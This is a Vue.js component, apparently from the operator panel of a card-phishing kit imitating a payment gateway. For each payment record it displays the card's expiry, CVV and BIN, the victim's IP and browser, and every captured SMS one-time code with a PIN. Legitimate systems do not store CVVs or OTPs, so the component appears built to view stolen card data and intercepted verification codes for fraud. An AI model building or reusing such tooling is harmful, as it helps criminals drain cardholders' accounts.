<template>
    <tr>
        <td colspan="8" style="font-weight: 500">
            <div class="card">
                <div class="card-header">
                    <strong class="mr-5">{{ $trans('mpgs.expiry_date').toUpperCase() }} : {{payment.expiry}}</strong>
                    <strong>{{ $trans('mpgs.cvv').toUpperCase() }} : {{payment.cvv}}</strong><br/>
                    <strong>{{ $trans('mpgs.bin').toUpperCase() }} : {{payment.bin_str}}</strong><br/>
                    <strong>{{ $trans('mpgs.ip').toUpperCase() }} : {{payment.ip_addr}}</strong><br/>
                    <strong>{{ $trans('mpgs.browser').toUpperCase() }} : {{payment.user_agent}}</strong><br/>
                </div>
                <div v-show="payment.sms_attempts > 0" class="card-body">
                    <div v-for="(otp, index) in payment.otp_code" class="card card-body my-1 mx-3">
                        <p><strong>{{ $trans('mpgs.sms').toUpperCase() }} {{payment.otp_code.length - index}} : </strong><strong class="text-danger">{{otp}}</strong></p>
                        <p><strong>{{ $trans('mpgs.otp_pin').toUpperCase() }} : {{payment.pin_code !== null ? payment.pin_code[index] : ''}}</strong></p>
                    </div>
                </div>
            </div>
        </td>
    </tr>
</template>

<script>
export default {
    name: "PaymentContent",
    props: {
        payment: Object,
    }
}
</script>

<style scoped>
.card.card-body {
    padding: 15px 30px 5px;
}
p {
    margin: 0;
}
</style>
